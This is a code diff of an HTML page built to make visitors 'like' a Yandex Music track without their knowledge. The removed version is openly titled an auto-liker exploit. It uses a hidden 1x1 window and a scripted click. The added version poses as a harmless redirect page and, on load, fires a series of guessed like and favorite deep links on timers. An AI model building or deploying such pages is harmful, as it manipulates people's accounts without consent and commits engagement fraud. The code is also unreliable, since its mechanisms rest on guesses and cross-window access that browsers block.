@@ -1,48 +1,63 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Yandex Music Auto-Liker Exploit</title>
-    <script type="text/javascript">
-        const TRACK_ID = "136101590";  
-        const WEB_LIKE_URL = `https://music.yandex.ru/track/${TRACK_ID}/like`;
-        const WEB_TRACK_URL = `https://music.yandex.ru/album/35390714/track/${TRACK_ID}?play=true`;
-        const DEEP_LINK = `yandexmusic://track/${TRACK_ID}?play=1`;
-
-        function openYandexApp() {
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting to Yandex Music...</title>
+    <script>
+        function getOS() {
             var userAgent = navigator.userAgent || navigator.vendor || window.opera;
-            
-            if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
-                setTimeout(() => { window.location.href = WEB_TRACK_URL; }, 1500);
-                window.location.href = DEEP_LINK;
-            } else if (/android/i.test(userAgent)) {
-                setTimeout(() => { window.location.href = WEB_TRACK_URL; }, 1500);
-                window.location.href = DEEP_LINK;
+            if (/android/i.test(userAgent)) {
+                return "android";
+            } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+                return "ios";
             } else {
-                window.location.href = WEB_TRACK_URL;
+                return "web";
+            }
+        }
+
+        function openYandexMusic() {
+            var trackId = "12345678"; // Replace with the actual track ID
+            var os = getOS();
+
+            if (os === "android") {
+                // Android Deep Link
+                var playLink = "yandexmusic://track/" + trackId + "?play=1";
+                var likeAttempts = [
+                    "yandexmusic://track/" + trackId + "?action=like",
+                    "yandexmusic://track/" + trackId + "?play=1&like=1",
+                    "yandexmusic://track/" + trackId + "?play=1&favorite=1"
+                ];
+            } else if (os === "ios") {
+                // iOS Deep Link
+                var playLink = "yandexmusic://track/" + trackId + "?play=true";
+                var likeAttempts = [
+                    "yandexmusic://track/" + trackId + "?action=like",
+                    "yandexmusic://track/" + trackId + "?play=true&like=true",
+                    "yandexmusic://track/" + trackId + "?play=true&favorite=true"
+                ];
+            } else {
+                // Web Version (Desktop)
+                var playLink = "https://music.yandex.ru/track/" + trackId + "?play=1";
+                var likeAttempts = [
+                    "https://music.yandex.ru/track/" + trackId + "?action=like",
+                    "https://music.yandex.ru/track/" + trackId + "?play=1&like=1",
+                    "https://music.yandex.ru/track/" + trackId + "?play=1&favorite=1"
+                ];
             }
 
-            // Delay WebView injection for 5 seconds
-            setTimeout(autoLikeUsingWebView, 5000);
-        }
+            // Open the track with auto-play
+            window.location.href = playLink;
 
-        function autoLikeUsingWebView() {
-            let likeWindow = window.open(WEB_LIKE_URL, "_blank", "width=1,height=1,noopener,noreferrer");
-            
-            // Execute JavaScript inside the opened Yandex Music web page
-            setTimeout(() => {
-                likeWindow.document.querySelector('[aria-label="Like"]').click();
-                console.log("✅ Forced Like Button Click inside WebView!");
-                setTimeout(() => { likeWindow.close(); }, 3000);
-            }, 4000);
-        }
-
-        function executeHack() {
-            openYandexApp();
-            autoLikeUsingWebView();
+            // Attempt to like the track after delays
+            setTimeout(() => { window.location.href = likeAttempts[0]; }, 2000);
+            setTimeout(() => { window.location.href = likeAttempts[1]; }, 4000);
+            setTimeout(() => { window.location.href = likeAttempts[2]; }, 6000);
         }
     </script>
 </head>
-<body onload="executeHack()">
-    <p>Redirecting to Yandex Music...</p>
+<body onload="openYandexMusic()">
+    <h1>Redirecting to Yandex Music...</h1>
+    <p>If you are not redirected, <a href="#" onclick="openYandexMusic()">click here</a>.</p>
 </body>
 </html>
